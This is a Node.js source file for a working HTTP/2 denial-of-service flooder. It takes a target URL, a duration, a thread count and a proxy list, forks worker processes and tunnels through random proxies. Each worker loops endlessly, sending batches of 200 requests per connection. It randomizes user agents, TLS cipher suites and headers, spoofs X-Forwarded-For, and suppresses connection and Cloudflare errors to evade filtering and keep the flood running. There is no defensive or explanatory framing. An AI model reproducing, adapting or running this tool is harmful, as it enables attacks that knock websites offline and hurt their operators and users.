const url = require('url'),
fs = require('fs'),
http2 = require('http2'),
http = require('http'),
tls = require('tls'),
net = require('net'),
cluster = require('cluster'),
fakeua = require('fake-useragent'),
browsers = [
    'Maxthon',
    'Brave',
    'DuckDuckgo',
    'Waterfox',
    'UC Browser',
    'Slimjet Browser',
    'Comodo IceDragon',
    'Baidu Browser',
    'Microsoft Edge',
    'Google Chrome',
    'Firefox',
    'Safari',
    'Opera',
    'Chrome Android',
    'Samsung Internet', 
    'WebView Android'
        ], 
cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "DHE-RSA-AES128-CCM",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "DHE-PSK-AES128-GCM-SHA256",
    "DHE-RSA-AES256-CCM",
    "DHE-PSK-AES128-CCM8",
    "DHE-DSS-AES128-GCM-SHA256",
    "TLS_AES_128_GCM_SHA256",
    "DHE-PSK-AES256-GCM-SHA384",
    "DHE-PSK-AES256-CCM8",
    "DHE-RSA-AES128-CCM8",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "DHE-PSK-AES128-CCM",
    "TLS_AES_256_GCM_SHA384",
    "DHE-RSA-AES128-GCM-SHA256",
    "DHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES256-CCM",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "DHE-PSK-AES256-CCM",
    "TLS_AES_128_CCM_SHA256",
    "ECDHE-ECDSA-AES128-CCM8",
    "DHE-RSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "DHE-DSS-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES256-CCM8",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES128-CCM",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "EECDH:!SSLv2:!SSLv3:!TLSv1:!TLSv1.1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
    "EECDH:!SSLv2:!SSLv3:!TLSv1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
    "EECDH:!SSLv2:!SSLv3:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
    "EECDH:!SSLv2:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
    "EECDH:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
    "ALL:!aNULL:!ADH:!eNULL:!LOW:!EXP:RC4+RSA:+HIGH:+MEDIUM",
    "ALL:!aNULL:!eNULL",
    "EECDH:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
    "EECDH:!SSLv2:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
    "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
    ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
];
accept_header = [    
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*',
    'image/avif,image/webp,*/*',
    'image/webp,*/*',
    'image/png,image/*;q=0.8,*/*;q=0.5',
    'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
    'application/octet-stream; charset=utf-8',
    'image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
    'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
    "application/javascript; charset=utf-8",
    'image/png,image/svg+xml,image/*;q=0.8, */*;q=0.5',
    'text/*;q=0.3, text/html;q=0.7, text/html;level=1,',
    'text/css,*/*;q=0.1',
    'text/html; charset=UTF-8',
    'text/html;level=2;q=0.4, */*;q=0.5',
    'text/javascript; charset=UTF-8',
    'application/x-www-form-urlencoded',
    'content-type,x-tawk-token',
    'text/css',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'application/javascript, */*;q=0.8',
    'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
    'image/svg+xml',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
],
lang_header = [
  "ko-KR",
  "en-US",
  "zh-CN",
  "zh-TW",
  "ja-JP",
  "en-GB",
  "en-AU",
  'en-GB,en-US;q=0.9,en;q=0.8',
 "en-GB,en;q=0.5",
  "en-CA",
  'en-UK, en, de;q=0.5',
  "en-NZ",
  'en-GB,en;q=0.6',
  "en-ZA",
  "en-IN",
  "en-PH",
  "en-GB,en",
  "en-SG",
  "en-HK",
  "en-GB,en;q=0.8",
  'en-GB,en;q=0.9',
  " en-GB,en;q=0.7",
  "*",
  "en-US,en;q=0.5",
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  "utf-8, iso-8859-1;q=0.5, *;q=0.1",
  "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
  "en-GB, en-US, en;q=0.9",
  "de-AT, de-DE;q=0.9, en;q=0.5",
  "cs;q=0.5",
  "da, en-gb;q=0.8, en;q=0.7",
  "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
  "en-US,en;q=0.9",
  "de-CH;q=0.7",
  "tr",
],
encoding_header = [
    '*',
    'gzip',
    'gzip, deflate',
    'br',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    'gzip',
    'gzip;q=1.0, identity; q=0.5, *;q=0',
    'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
    'compress;q=0.5, gzip;q=1.0',
    'identity',
    'gzip, compress',
    'compress, deflate',
    'compress',
    'gzip, deflate, br',
    'deflate',
    'gzip, deflate, lzma, sdch',
    'deflate'
],
controle_header = [
    'max-age=604800',
    'proxy-revalidate',
    'public, max-age=0',
    'max-age=315360000',
    'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
    'max-age=0, no-cache, no-store',
    's-maxage=604800',
    'max-stale',
    'public, immutable, max-age=31536000',
    'must-revalidate',
    'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
    'max-age=31536000,public,immutable',
    'max-age=31536000,public',
    'min-fresh',
    'public, max-age=12706231',
    'private',
    'public',
    's-maxage',
    'no-cache, no-store, max-age=0, must-revalidate',
    'no-cache',
    'no-cache, no-transform',
    'max-age=2592000',
    'no-store',
    'no-transform',
    'max-age=31557600',
    'stale-if-error',
    'only-if-cached',
    'max-age=0',
    'must-understand, no-store',
    'max-age=86400, enforce',
    'max-age=31536000; includeSubDomains',
    'public, max-age=14400',
    'max-age=31536000; includeSubDomains; preload',
    'max-age=120',
    'max-age=0,no-cache,no-store,must-revalidate',
    'public, max-age=604800, immutable',
    'max-age=0, must-revalidate, private',
    'max-age=0, private, must-revalidate',
    'private, must-revalidate',
    'max-age=604800, stale-while-revalidate=86400',
    'max-stale=3600',
    'public, max-age=2678400',
    'min-fresh=600',
    'public, max-age=30672000',
    'max-age=31536000, immutable',
    'max-age=604800, stale-if-error=86400',
    'public, max-age=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
    'public, s-maxage=600, max-age=60',
    'public, max-age=31536000',
    'max-age=14400, public',
    'max-age=14400',
    'public, s-maxage=600, max-age=60',
    'no-store, no-cache, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate'
],
sechuas = [
    'Android', 
    'Chrome OS',
    'Chromium OS', 
    'iOS', 
    'Linux', 
    'macOS', 
    'Unknown', 
    'Windows'
    ], 
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];
tls.DEFAULT_ECDH_CURVE;
tls.authorized = true;
tls.sync = true;
process.on('uncaughtException', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).on('unhandledRejection', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).on('warning', e => {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).setMaxListeners(0);

function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
}


function lang() {
    return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function encoding() {
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
}
function browser() {
    return browsers[Math['floor'](Math['random']() * browsers['length'])]
}

function cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
}

const target = process.argv[2], time = process.argv[3], thread = process.argv[4], proxys = fs.readFileSync(process.argv[5], 'utf-8').toString().match(/\S+/g);

function proxyr() {
    return proxys[Math.floor(Math.random() * proxys.length)];
}
function sechua() {
    return sechuas[Math['floor'](Math['random']() * sechuas['length'])]
}
if(cluster.isMaster) {
const dateObj = new Date();
  
    console.log(`\x1b[36mURL: \x1b[37m${url.parse(target).host}\n\x1b[36mThread: \x1b[37m${thread}\n\x1b[36mTime: \x1b[37m${time}\n\x1b[36mProxylist: \x1b[37m${process.argv[5]} \x1b[36m- \x1b[37m${proxys.length}\n\x1b[36mTimestamp: \x1b[37m${dateObj.toDateString()} ${dateObj.toTimeString()}`);

    for(var bb=0;bb<thread;bb++) {

        cluster.fork();

    }

    setTimeout(() => {

        process.exit(-1)
    
    }, time * 1000)

}else {


    function flood() {

        var parsed = url.parse(target);

        const uas = fakeua();

        var cipper = cipher()

        var proxy = proxyr().split(':')

        var header = {
            ":method": "GET",
            ":path": parsed.path,
            "Origin": target,
			"User-agent": uas,
            "X-Forwarded-For": proxy[0],
            "X-Forwarded-Host": proxy[0], 
			"Upgrade-Insecure-Requests": "1",
            "Accept": accept(),
            "Accept-encoding": encoding(),
            "Accept-Language": lang(),
            "Cache-Control": controling(),
            "DNT": '1',
            "Sec-ch-ua": browser() + ';v=105,Not;A Brand;v=99,Chromium;v=109',
            "sec-ch-ua-platform": sechua(),
            "X-Frame-Options": 'DENY',
            "X-Content-Type-Options": 'nosniff',
            "X-XSS-Protection": '1; mode=block',
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'none',
            "sec-fetch-user": '?1',
            "sec-gpc": '1',
            "TE": 'trailers',
            "Trailer": 'Max-Forwards',
            "Pragma": 'client-x-cache-on, client-x-cache-remote-on, client-x-check-cacheable, client-x-get-cache-key, client-x-get-extracted-values, client-x-get-ssl-client-session-id, client-x-get-true-cache-key, client-x-serial-no, client-x-get-request-id,client-x-get-nonces,client-x-get-client-ip,client-x-feo-trace',
            "Upgrade-Insecure-Requests": '1',
            "X-Forwarded-Proto": 'HTTP',
        }
        
        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 20000,
            maxSockets: 0,
        });
                
        var req = http.request({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            },
            method: 'CONNECT',
            path: parsed.host+':443'
        }, function(){ 
            req.setSocketKeepAlive(true);
        });
    
        req.on('connect', function (res, socket, head) { 
        
            const client = http2.connect(parsed.href, {
                createConnection: () => tls.connect({
                    host: parsed.host,
                    ciphers: cipper, 
                    secureProtocol: 'TLS_method',
                    TLS_MIN_VERSION: '1.2',
                    TLS_MAX_VERSION: '1.3',
                    curve: "GREASE:X25519:x25519",
                    servername: parsed.host,
                    challengesToSolve: 5,
                    cloudflareTimeout: 5000,
                    cloudflareMaxTimeout: 30000,
                    resolveWithFullResponse: true,
                    HonorCipherOrder: true,
                    UseStapling: true,
                    maxRedirects: 20,
                    followAllRedirects: true,
                    decodeEmails: false,
                    gzip: true,
                    secure: true,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2'],
                    socket: socket
                }, function () {
                    for (let i = 0; i< 200; i++){
                        const req = client.request(header);
                        req.setEncoding('utf8');

                        req.on('data', (chunk) => {
                            // data += chunk;
                        });
                        req.on("response", () => {
                            req.close();
                        })
                        req.end();
                    }
                })
            });
        });

        req.end();

    }

    setInterval(() => { flood() })
  }
